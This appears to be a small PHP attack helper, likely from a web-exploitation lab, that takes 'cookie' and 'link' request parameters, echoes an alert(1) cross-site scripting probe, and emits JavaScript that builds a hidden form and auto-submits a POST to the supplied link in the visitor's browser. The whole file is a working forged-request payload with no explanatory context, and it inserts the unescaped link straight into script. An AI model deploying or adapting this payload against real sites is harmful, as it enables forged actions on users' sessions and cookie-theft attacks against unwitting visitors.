<?php
$cookie = $_REQUEST['cookie'];
$link = $_REQUEST['link'];
echo "<script>alert(1)</script>";
echo "
<script>
function post(path, params, method='post') 
{
  const form = document.createElement('form');
  form.method = method;
  form.action = path;

  for (const key in params) 
  {
    if (params.hasOwnProperty(key)) 
    {
      const hiddenField = document.createElement('input');
      hiddenField.type = 'hidden';
      hiddenField.name = key;
      hiddenField.value = params[key];
      hiddenField.target = '_parent';

      form.appendChild(hiddenField);
    }
  }

  document.body.appendChild(form);
  form.submit();
}
post($link, {}, 'post');
</script>";

?>